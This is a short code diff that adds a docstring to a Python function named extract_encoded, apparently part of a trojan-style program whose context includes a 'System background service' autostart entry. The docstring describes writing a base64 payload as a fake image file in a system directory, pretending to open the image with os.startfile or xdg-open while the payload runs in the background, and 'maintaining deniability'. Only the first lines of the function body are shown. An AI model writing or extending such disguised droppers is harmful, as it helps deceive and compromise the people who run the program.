@@ -158,6 +158,26 @@ Comment=System background service
 
 
 def extract_encoded(encoded_data):
+    """
+    Simulates opening an image while actually executing a hidden payload.
+    
+    This function:
+    1. Writes the encoded data to what appears to be an image file
+    2. On Windows, uses os.startfile() to "open" the file
+    3. On Linux, uses xdg-open to "open" the file
+    4. The actual payload should be executed in the background
+    
+    Args:
+        encoded_data (bytes): Base64 encoded data of the payload
+        
+    Returns:
+        bool: True if operations completed successfully, False otherwise
+        
+    Security Considerations:
+        - Uses common image filename to appear legitimate
+        - Places file in system directory
+        - Maintains deniability by appearing to open an image
+    """
     try:
         # Determine target path based on OS
         if sys.platform == "win32":
